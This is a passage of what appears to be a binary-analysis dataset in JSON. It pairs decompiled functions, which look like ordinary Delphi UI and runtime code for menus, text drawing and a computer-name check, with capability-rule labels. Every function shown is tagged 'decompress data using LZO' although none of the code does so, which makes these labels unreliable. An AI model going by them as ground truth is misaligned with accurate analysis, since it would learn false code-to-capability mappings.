        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0042bfd9)\n// WARNING: Removing unreachable block (ram,0x0042bfef)\n\nvoid __fastcall fcn.0042bf08(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uVar4;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint lpBuffer;\n    uint var_38h;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint var_28h;\n    uint var_24h;\n    uint nSize;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack108 = 0x42bf35;\n    var_10h = param_2;\n    fcn.00405fe8();\n    uStack112 = 0x42c0a9;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    puStack108 = &stack0xfffffffc;\n    if (*0x492e9c == NULL) {\n        puStack108 = &stack0xfffffffc;\n        fcn.0040dbc0();\n        fcn.00404ec4();\n    }\n    fcn.00403af4();\n    var_24h = fcn.00405eb8();\n    var_38h = *0x42c0b8;\n    uStack56 = *0x42c0bc;\n    uStack52 = *0x42c0c0;\n    uStack48 = *0x42c0c4;\n    var_ch = &fcn.0042bf08::var_38h;\n    fcn.0040700c();\n    var_4h = 0;\n    iVar1 = fcn.00405ec8();\n    if (iVar1 < 1) {\n        uVar2 = 0x15;\n    }\n    else {\n        nSize = 0x10;\n        iVar1 = sub.kernel32.dll_GetComputerNameA(&fcn.0042bf08::lpBuffer, &fcn.0042bf08::nSize);\n        if (iVar1 == 0) {\n            bVar3 = false;\n        }\n        else {\n            fcn.004057a0();\n            fcn.004057d4();\n            fcn.004057d4(0);\n            uVar2 = fcn.004059dc();\n            fcn.004057a0(0, uVar2);\n            uVar2 = fcn.004059dc();\n            iVar1 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n            bVar3 = iVar1 == 2;\n        }\n        if (bVar3) {\n            uVar2 = 0x15;\n        }\n        else {\n            uVar2 = 0x10;\n        }\n    }\n    uVar4 = var_10h;\n    (**0x492e9c)(var_10h, 0, uVar2, &fcn.0042bf08::var_28h, 1, &fcn.0042bf08::var_ch);\n    fcn.0042bd2c();\n    fcn.0042bd2c();\n    fcn.00407024();\n    *in_FS_OFFSET = uVar4;\n    fcn.00405554(0x42c0b0);\n    fcn.004060ac();\n    return;\n}\n",
        "token_count": 824
    },
    "0042c3dc": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c3dc(int32_t arg_8h, int16_t **arg_ch)\n\n{\n    int16_t **ppiVar1;\n    uchar *puVar2;\n    uint8_t uVar3;\n    char cVar4;\n    int32_t *in_EAX;\n    int16_t *piVar5;\n    int32_t iVar6;\n    char *in_EDX;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t **in_FS_OFFSET;\n    uint uVar9;\n    int32_t *piStack1656;\n    uint uStack1652;\n    uchar *puStack1648;\n    int32_t *piStack1644;\n    uint uStack1640;\n    uchar *puStack1636;\n    uint32_t var_650h;\n    uint bstrString;\n    int32_t aiStack592 [127];\n    uint *var_50h;\n    uint *var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    int16_t **var_40h;\n    int16_t **var_3ch;\n    int16_t **var_38h;\n    int16_t **var_34h;\n    int32_t var_30h;\n    int16_t *var_2ch;\n    uint *var_28h;\n    int32_t *var_24h;\n    uint var_20h;\n    \n    puStack1648 = &stack0xfffffffc;\n    puStack1636 = 0x42c3fe;\n    var_24h = in_EAX;\n    fcn.00405fe8();\n    uStack1640 = 0x42c707;\n    piStack1644 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff994;\n    var_30h = 0;\n    uStack1652 = 0x42c6e4;\n    piStack1656 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff988;\n    var_48h = in_EDX[1];\n    puVar2 = &stack0xfffffffc;\n    puStack1636 = &stack0xfffffffc;\n    if (0x40 < var_48h) {\n        puStack1636 = &stack0xfffffffc;\n        fcn.0040dbc0();\n        fcn.00404ec4();\n        puVar2 = puStack1648;\n    }\n    puStack1648 = puVar2;\n    if (var_48h != 0) {\n        var_34h = arg_ch;\n        var_38h = &fcn.0042c3dc::var_650h + var_48h * 4;\n        uVar7 = 0;\n        do {\n            ppiVar1 = var_34h;\n            var_38h = var_38h + -4;\n            var_2ch = in_EDX[uVar7 + 3] & 0x7f;\n            uVar3 = in_EDX[uVar7 + 3] & 0x80;\n            if (var_2ch == 0xa) {\n                *var_38h = 0xa;\n                var_38h[2] = 0x80020004;\n            }\n            else {\n                if (var_2ch == 0x48) {\n                    var_3ch = &fcn.0042c3dc::bstrString + var_30h * 2;\n                    if (uVar3 == 0) {\n                        piVar5 = fcn.0040646c();\n                        *var_3ch = piVar5;\n                        var_3ch[1] = NULL;\n                        *var_38h = 0x8;\n                        var_38h[2] = *var_3ch;\n                    }\n                    else {\n                        piVar5 = fcn.0040646c();\n                        *var_3ch = piVar5;\n                        var_3ch[1] = *var_34h;\n                        *var_38h = 0x4008;\n                        var_38h[2] = var_3ch;\n                    }\n                    var_30h = var_30h + 1;\n                }\n                else if (uVar3 == 0) {\n                    if (var_2ch == 0xc) {\n                        if (*var_34h == 0x100) {\n                            var_40h = &fcn.0042c3dc::bstrString + var_30h * 2;\n                            piVar5 = fcn.0040646c();\n                            *var_40h = piVar5;\n                            var_40h[1] = NULL;\n                            *var_38h = 0x8;\n                            var_38h[2] = *var_40h;\n                            var_30h = var_30h + 1;\n                        }\n                        else {\n                            *var_38h = *var_34h;\n                            var_38h[1] = ppiVar1[1];\n                            var_38h[2] = ppiVar1[2];\n                            var_38h[3] = ppiVar1[3];\n                            var_34h = var_34h + 3;\n                        }\n                    }\n                    else {\n                        *var_38h = var_2ch;\n                        var_38h[2] = *var_34h;\n                        if ((4 < var_2ch) && (var_2ch < 8)) {\n                            var_34h = var_34h + 1;\n                            var_38h[3] = *var_34h;\n                        }\n                    }\n                }\n                else {\n                    if ((var_2ch == 0xc) && (**var_34h == 0x100)) {\n                        fcn.00411d3c();\n                    }\n                    *var_38h = var_2ch | 0x4000;\n                    var_38h[2] = *var_34h;\n                }\n                var_34h = var_34h + 1;\n            }\n            uVar7 = uVar7 + 1;\n        } while (var_48h != uVar7);\n    }\n    var_50h = &fcn.0042c3dc::var_650h;\n    var_4ch = var_28h + 1;\n    var_44h = in_EDX[2];\n    uVar9 = *var_28h;\n    cVar4 = *in_EDX;\n    if (cVar4 == '\\x04') {\n        if ((var_650h & 0xfff) == 9) {\n            cVar4 = '\\b';\n        }\n        *var_28h = 0xfffffffd;\n        var_4ch = var_28h;\n        var_44h = var_44h + 1;\n    }\n    else if (((cVar4 == '\\x01') && (var_48h == 0)) && (arg_8h != 0)) {\n        cVar4 = '\\x03';\n    }\n    iVar6 = (**(*var_24h + 0x18))\n                      (var_24h, uVar9, *0x495a0c, 0, cVar4, &fcn.0042c3dc::var_50h, arg_8h, &fcn.0042c3dc::var_20h, 0);\n    iVar8 = var_30h;\n    if (iVar6 != 0) {\n        fcn.0042c9b4();\n        iVar8 = var_30h;\n    }\n    while (iVar8 != 0) {\n        iVar8 = iVar8 + -1;\n        if (*(&stack0xfffffdb0 + iVar8 * 8) != 0) {\n            fcn.00406448();\n        }\n    }\n    *in_FS_OFFSET = var_24h;\n    iVar8 = var_30h;\n    while (iVar8 != 0) {\n        iVar8 = iVar8 + -1;\n        sub.oleaut32.dll_SysFreeString_1(uVar9, (&fcn.0042c3dc::bstrString)[iVar8 * 2]);\n    }\n    return;\n}\n",
        "token_count": 1794
    },
    "004315a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004315a0(uint param_1, int32_t param_2)\n\n{\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    param_2 = param_2 + 1;\n    fcn.004059dc();\n    fcn.0043143c(param_2);\n    return;\n}\n",
        "token_count": 86
    },
    "00433cd4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuchar __fastcall fcn.00433cd4(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    var_5h = 0;\n    iVar2 = *in_EAX;\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + -4);\n    }\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    if (param_2 <= iVar2) {\n        uVar1 = fcn.004059dc();\n        fcn.004059dc(uVar1);\n        iVar2 = fcn.00409b64();\n        if (iVar2 == 0) {\n            var_5h = 1;\n            fcn.00405a84();\n        }\n    }\n    return var_5h;\n}\n",
        "token_count": 219
    },
    "00433d5c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00433e23)\n\nvoid fcn.00433d5c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int16_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack36 = 0x433d75;\n    fcn.004059cc();\n    uStack40 = 0x433e7f;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    do {\n        do {\n            cVar1 = fcn.00433cd4();\n        } while (cVar1 != '\\0');\n        cVar1 = fcn.00433cd4();\n    } while (((cVar1 != '\\0') || (cVar1 = fcn.00433cd4(),  cVar1 != '\\0')) || (cVar1 = fcn.00433cd4(),  cVar1 != '\\0'));\n    if (in_EAX != 0) {\n        iVar4 = 8;\n        do {\n            fcn.00433adc();\n            iVar3 = in_EAX;\n            if (in_EAX != 0) {\n                iVar3 = *(in_EAX + -4);\n            }\n            uVar2 = fcn.004059dc(0);\n            fcn.004059dc(iVar3, uVar2);\n            uStack44 = 0x400;\n            iVar3 = sub.kernel32.dll_CompareStringA_1();\n        } while ((iVar3 != 2) && (iVar4 = iVar4 + 1,  iVar4 != 0x256));\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x433e86;\n    uStack40 = 0x433e76;\n    fcn.00405530();\n    uStack40 = 0x433e7e;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 489
    },
    "00434a80": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00434acc)\n// WARNING: Removing unreachable block (ram,0x00434ad6)\n\nvoid __cdecl fcn.00434a80(uint32_t arg_8h, uint arg_ch, uint *lprc)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint *in_FS_OFFSET;\n    uchar uVar6;\n    uint uStackY120;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_18h;\n    uint uStack24;\n    uint uStack20;\n    uint var_ch;\n    uint var_8h;\n    char *var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack52 = 0x434c6c;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    iVar2 = fcn.00436afc();\n    if ((iVar2 != 0) && (cVar1 = fcn.0043837c(),  cVar1 != '\\0')) {\n        arg_8h = arg_8h | 0x20002;\n    }\n    fcn.004055c8();\n    uVar6 = (arg_8h & 0x400) == 0;\n    if ((!uVar6) &&\n       ((uVar6 = var_4h == NULL,  uVar6 || ((uVar6 = *var_4h == '&',  uVar6 && (uVar6 = var_4h[1] == '\\0',  uVar6))))))\n    {\n        fcn.00405818();\n    }\n    fcn.00405974();\n    if (uVar6) {\n        if ((arg_8h & 0x400) == 0) {\n            var_1ch = *lprc;\n            uStack24 = lprc[2];\n            uStack20 = lprc[3];\n            var_18h = lprc[1] + 4;\n            uVar3 = fcn.004256c0(&var_1ch, 6, 2);\n            sub.user32.dll_DrawEdge(uVar3);\n        }\n        goto code_r0x00434c56;\n    }\n    fcn.00425080();\n    if (*(in_EAX + 0x3a) != '\\0') {\n        fcn.00424a28();\n        fcn.00424a34();\n    }\n    if (*(in_EAX + 0x39) == '\\0') {\n        if (arg_ch == '\\0') {\n            sub.user32.dll_OffsetRect(lprc, 1, 1);\n            fcn.004246a8();\n            pcVar5 = var_4h;\n            if (var_4h != NULL) {\n                pcVar5 = *(var_4h + -4);\n            }\n            uVar3 = fcn.004059dc(pcVar5, lprc, arg_8h);\n            uVar3 = fcn.004256c0(uVar3);\n            sub.user32.dll_DrawTextA(uVar3);\n            sub.user32.dll_OffsetRect(lprc, 0xffffffff, 0xffffffff);\n        }\n        if (arg_ch != '\\0') {\n            iVar2 = fcn.004241dc();\n            iVar4 = fcn.004241dc();\n            if (iVar2 == iVar4) {\n                fcn.004246a8();\n                goto code_r0x00434c2d;\n            }\n        }\n        fcn.004246a8();\n    }\ncode_r0x00434c2d:\n    pcVar5 = var_4h;\n    if (var_4h != NULL) {\n        pcVar5 = *(var_4h + -4);\n    }\n    uVar3 = fcn.004059dc(pcVar5, lprc, arg_8h);\n    uStackY120 = fcn.004256c0(uVar3);\n    sub.user32.dll_DrawTextA();\ncode_r0x00434c56:\n    *in_FS_OFFSET = uStackY120;\n    fcn.00405530(0x434c73);\n    return;\n}\n",
        "token_count": 967
    },
    "00436fa8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00436fa8(int32_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar uVar5;\n    uint in_stack_ffffffb8;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    char var_9h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_18h = 0;\n    var_14h = 0;\n    uStack44 = 0x4370eb;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    var_9h = '\\0';\n    var_10h = *in_EAX;\n    iVar2 = var_10h;\n    if (var_10h != 0) {\n        iVar2 = *(var_10h + -4);\n    }\n    if (0 < iVar2) {\n        iVar4 = 1;\n        do {\n            uVar3 = *(*in_EAX + -1 + iVar4);\n            if ((*(*0x495d0c + (uVar3 >> 3)) >> (uVar3 & 7) & 1) != 0) {\n                var_9h = '\\x01';\n                break;\n            }\n            iVar4 = iVar4 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    var_8h = param_1;\n    var_4h = param_2;\n    if (var_9h == '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (param_1 != 0) {\n            fcn.00405acc();\n            puVar1 = puStack40;\n        }\n    }\n    else {\n        var_10h = *in_EAX;\n        iVar2 = var_10h;\n        if (var_10h != 0) {\n            iVar2 = *(var_10h + -4);\n        }\n        uVar5 = iVar2 == 2;\n        puStack40 = &stack0xfffffffc;\n        fcn.00405a44(&var_14h);\n        fcn.00405974();\n        if (uVar5) {\n            var_10h = *in_EAX;\n            fcn.00405a44(&var_18h);\n            in_stack_ffffffb8 = var_4h;\n            fcn.004058e0(0x437100, 0x437124, var_4h, 0x437118, 0x43710c, var_18h);\n            puVar1 = puStack40;\n        }\n        else {\n            in_stack_ffffffb8 = 0x437124;\n            fcn.004058e0(0x437124, var_4h, 0x437118, 0x43710c, *in_EAX);\n            puVar1 = puStack40;\n        }\n    }\n    puStack40 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffb8;\n    fcn.00405554(0x4370f2);\n    return;\n}\n",
        "token_count": 764
    },
    "00437128": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00437128(uint param_1, uchar param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t unaff_EDI;\n    uint *in_FS_OFFSET;\n    uchar uVar7;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uchar *var_38h;\n    uint *var_34h;\n    uint uStack52;\n    int32_t *var_2ch;\n    uchar auStack44 [3];\n    uint var_25h;\n    int32_t var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    var_1ch = &stack0xfffffffc;\n    var_ch = 0x8;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != NULL);\n    var_20h = 0x4375b0;\n    unique0x00007a00 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00437128::var_25h + 1;\n    _auStack44 = CONCAT13(param_2, auStack44) & 0xff00ffff;\n    puVar1 = &stack0xfffffffc;\n    var_18h = unaff_EDI;\n    if (var_25h == '\\0') {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            _auStack44 = 0x437169;\n            cVar2 = fcn.00437768();\n            puVar1 = var_1ch;\n            if (cVar2 != '\\0') goto code_r0x00437171;\n        }\n        *in_FS_OFFSET = stack0xffffffd8;\n        var_1ch = 0x4375b7;\n        var_20h = 0x43759a;\n        fcn.00405554();\n        var_20h = 0x4375a7;\n        fcn.00405554();\n        var_20h = 0x4375af;\n        fcn.00405530();\n        return;\n    }\ncode_r0x00437171:\n    var_1ch = puVar1;\n    _auStack44 = 0x43717f;\n    fcn.004055c8();\n    var_ch = NULL;\n    var_14h = NULL;\n    var_8h = NULL;\n    var_10h = 0;\n    var_2ch = 0x437579;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    var_34h = 0x4371b2;\n    _auStack44 = &stack0xfffffffc;\n    var_ch = fcn.00404620();\n    var_34h = 0x4371c1;\n    var_14h = fcn.00404620();\n    var_34h = 0x4371d0;\n    var_2ch = fcn.00404620();\n    var_34h = 0x4371df;\n    var_8h = fcn.00404620();\n    var_34h = 0x4371e9;\n    iVar3 = fcn.0043653c();\n    if (-1 < iVar3 + -1) {\n        do {\n            var_34h = 0x437201;\n            iVar3 = fcn.0043654c();\n            uVar7 = *(iVar3 + 0x3e) == '\\0';\n            if (!uVar7) {\n                var_34h = 0x437214;\n                fcn.0043654c();\n                var_34h = 0x437221;\n                fcn.00405974();\n                if (!uVar7) {\n                    var_34h = 0x437230;\n                    iVar3 = fcn.0043654c();\n                    if (*(iVar3 + 0x30) != 0) {\n                        var_34h = 0x437243;\n                        fcn.0043654c();\n                        var_34h = 0x43724e;\n                        fcn.00439320();\n                        var_34h = 0x437259;\n                        fcn.004097e4();\n                        if (var_1ch == NULL) {\n                            var_34h = 0x437268;\n                            var_34h = fcn.0043654c();\n                            var_38h = 0x437272;\n                            fcn.0043654c();\n                            var_38h = 0x43727f;\n                            (**(*var_2ch + 100))();\n                        }\n                        else {\n                            var_34h = 0x43728f;\n                            iVar3 = fcn.0040e8d4();\n                            if (iVar3 != 0) {\n                                var_38h = 0x43729c;\n                                var_34h = &stack0xfffffffc;\n                                cVar2 = fcn.00436ef4(&stack0xfffffffc);\n                                if (cVar2 == '\\0') {\n                                    var_34h = 0x4372aa;\n                                    iVar3 = fcn.0043654c();\n                                    var_34h = iVar3 + 0x30;\n                                    var_38h = 0x4372b7;\n                                    fcn.0043654c();\n                                    var_38h = 0x4372c2;\n                                    fcn.00439230();\n                                    var_34h = 0x4372cb;\n                                    fcn.00405584();\n                                    var_34h = 0x4372d4;\n                                    var_34h = fcn.0043654c();\n                                    var_38h = 0x4372de;\n                                    fcn.0043654c();\n                                    var_38h = 0x4372eb;\n                                    (**(*var_2ch + 100))();\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        } while (var_34h != 0x1);\n    }\n    var_34h = 0x437300;\n    fcn.004055c8();\n    var_34h = 0x437308;\n    iVar3 = (**(*var_2ch + 0x14))();\n    if (-1 < iVar3 + -1) {\n        do {\n            var_34h = 0x437320;\n            fcn.004055c8();\n            var_34h = 0x43732b;\n            (**(*var_14h + 8))();\n            var_34h = 0x437333;\n            (**(*var_ch + 0x44))();\n            var_34h = 0x43733b;\n            iVar3 = (**(*var_14h + 0x14))();\n            iVar3 = iVar3 + -1;\n            if (-1 < iVar3) {\n                do {\n                    var_34h = 0x437354;\n                    (**(*var_14h + 0xc))();\n                    iVar6 = 1;\n                    while( true ) {\n                        var_34h = 0x4373f8;\n                        iVar5 = fcn.0040580c();\n                        if (iVar5 < iVar6) break;\n                        uVar4 = *(var_20h + -1 + iVar6);\n                        if ((*(*0x495d0c + (uVar4 >> 3)) >> (uVar4 & 7) & 1) == 0) {\n                            var_34h = &fcn.00437128::var_40h;\n                            var_38h = 0x43738a;\n                            fcn.00405a44();\n                            var_38h = 0x437395;\n                            fcn.004097e4();\n                            var_3ch = 0x43739e;\n                            var_38h = &stack0xfffffffc;\n                            cVar2 = fcn.00436ef4(&stack0xfffffffc);\n                            if (cVar2 != '\\0') {\n                                if (*(*0x495d2c + 0xc) == '\\0') {\n                                    var_38h = 0x4373cc;\n                                    fcn.00405acc();\n                                }\n                                else {\n                                    var_38h = 0x4373bb;\n                                    fcn.00436fa8();\n                                }\n                                var_38h = 0x4373d6;\n                                (**(*var_14h + 0x18))();\n                                var_38h = 0x4373e3;\n                                (**(*var_ch + 0x3c))();\n                                var_38h = 0x4373ed;\n                                (**(*var_14h + 0x48))();\n                                break;\n                            }\n                        }\n                        else {\n                            iVar6 = iVar6 + 1;\n                        }\n                        iVar6 = iVar6 + 1;\n                    }\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != -1);\n            }\n            var_34h = 0x437412;\n            iVar3 = (**(*var_ch + 0x14))();\n            if (var_10h < iVar3) {\n                var_38h = 0x43741d;\n                var_34h = &stack0xfffffffc;\n                fcn.00436f24(&stack0xfffffffc);\n            }\n            var_34h = 0x437426;\n            iVar3 = (**(*var_14h + 0x14))();\n            if (iVar3 < 1) break;\n            var_34h = 0x437432;\n            iVar3 = (**(*var_14h + 0x14))();\n            if (-1 < iVar3 + -1) {\n                do {\n                    var_34h = 0x437446;\n                    (**(*var_14h + 0x18))();\n                    var_34h = 0x437450;\n                    (**(*var_2ch + 0x5c))();\n                    var_34h = 0x43745a;\n                    (**(*var_2ch + 0x14))();\n                    var_34h = 0x437467;\n                    (**(*var_2ch + 0x70))();\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n        } while (var_34h != 0x1);\n    }\n    if (var_10h == 0) {\n        var_38h = 0x437480;\n        var_34h = &stack0xfffffffc;\n        fcn.00436f24(&stack0xfffffffc);\n    }\n    var_34h = 0x437489;\n    iVar3 = (**(*var_8h + 0x14))();\n    auStack44 = CONCAT12(0 < iVar3, auStack44._0_2_);\n    _auStack44 = _auStack44 & 0xff000000 | auStack44;\n    var_34h = 0x437497;\n    iVar3 = (**(*var_8h + 0x14))();\n    if (-1 < iVar3 + -1) {\n        do {\n            var_34h = 0x4374b3;\n            (**(*var_8h + 0xc))();\n            if (*(*0x495d2c + 0xc) != '\\0') {\n                var_34h = 0x4374cb;\n                iVar3 = fcn.0040e8d4();\n                if ((iVar3 == 0) && (var_18h != 0)) {\n                    var_34h = 0x4374e2;\n                    iVar3 = fcn.0040e8d4();\n                    if (iVar3 == 0) {\n                        var_34h = &fcn.00437128::var_44h;\n                        var_38h = 0x437505;\n                        fcn.00405a44();\n                        var_38h = 0x437512;\n                        fcn.00436fa8();\n                        var_38h = 0x43752c;\n                        fcn.00405a84();\n                    }\n                }\n            }\n            var_34h = 0x437536;\n            (**(*var_8h + 0x18))();\n            var_34h = 0x437541;\n            fcn.00405584();\n            var_34h = var_34h + -1;\n        } while (var_34h != NULL);\n    }\n    *in_FS_OFFSET = uStack52;\n    _auStack44 = 0x437580;\n    var_2ch = 0x437560;\n    fcn.00404650();\n    var_2ch = 0x437568;\n    fcn.00404650();\n    var_2ch = 0x437570;\n    fcn.00404650();\n    var_2ch = 0x437578;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 3021
    },
    "004383f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Removing unreachable block (ram,0x00438486)\n// WARNING: Removing unreachable block (ram,0x0043849e)\n\nvoid __cdecl fcn.004383f0(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint16_t in_DX;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    puStack44 = &var_2h + 2;\n    uStack48 = 0x43851b;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    if ((in_DX & 0x10) == 0) {\n        iVar1 = fcn.004379c0();\n        if ((iVar1 != 0) && (iVar2 = fcn.0043653c(),  in_ECX < iVar2)) {\n            iVar1 = fcn.0043654c();\n        }\n    }\n    else {\n        puStack44 = &var_2h + 2;\n        sub.user32.dll_GetSubMenu();\n        iVar1 = fcn.004379c0();\n        uStack60 = in_EAX;\n    }\n    if ((iVar1 != 0) && (*(iVar1 + 0x30) != 0)) {\n        fcn.00405718();\n        fcn.00405718();\n        fcn.00405718(0);\n        uVar3 = fcn.004059dc();\n        fcn.00405718(0, uVar3);\n        uVar3 = fcn.004059dc();\n        iVar1 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar3);\n        if (iVar1 == 2) {\n            fcn.00439320();\n        }\n    }\n    *in_FS_OFFSET = uStack60;\n    uStack52 = 0x438522;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 522
    },
    "00439230": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00439230(uint param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    fcn.00405584();\n    for (iVar3 = 1; iVar2 = fcn.0040580c(),  iVar3 <= iVar2; iVar3 = iVar3 + 1) {\n        uVar1 = *(*param_2 + -1 + iVar3);\n        if ((*(*0x495d0c + (uVar1 >> 3)) >> (uVar1 & 7) & 1) == 0) {\n            if (*(*param_2 + -1 + iVar3) == '&') {\n                if (*(*0x495d2c + 0xc) == '\\0') {\n                    bVar4 = false;\n                }\n                else {\n                    if (iVar3 < 2) {\n                        bVar4 = false;\n                    }\n                    else {\n                        iVar2 = *param_2;\n                        if (iVar2 != 0) {\n                            iVar2 = *(iVar2 + -4);\n                        }\n                        bVar4 = 1 < iVar2 - iVar3;\n                    }\n                    if (bVar4) {\n                        bVar4 = *(*param_2 + -2 + iVar3) == '(';\n                    }\n                    else {\n                        bVar4 = false;\n                    }\n                    if (bVar4) {\n                        bVar4 = *(*param_2 + 1 + iVar3) == ')';\n                    }\n                    else {\n                        bVar4 = false;\n                    }\n                }\n                if (bVar4) {\n                    fcn.00405a84();\n                }\n                else {\n                    fcn.00405a84();\n                }\n            }\n        }\n        else {\n            iVar3 = iVar3 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 412
    },
    "00439320": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.00439320(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    fcn.00405530();\n    iVar3 = 1;\n    iVar1 = in_EAX;\n    if (in_EAX != 0) {\n        iVar1 = *(in_EAX + -4);\n    }\n    if (0 < iVar1) {\n        do {\n            uVar2 = *(in_EAX + -1 + iVar3);\n            if ((*(*0x495d0c + (uVar2 >> 3)) >> (uVar2 & 7) & 1) == 0) {\n                if (((*(in_EAX + -1 + iVar3) == '&') && (0 < iVar1 - iVar3)) &&\n                   (iVar3 = iVar3 + 1,  *(in_EAX + -1 + iVar3) != '&')) {\n                    fcn.00405718();\n                }\n            }\n            else {\n                iVar3 = iVar3 + 1;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 <= iVar1);\n    }\n    return;\n}\n",
        "token_count": 263
    },
    "00439388": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
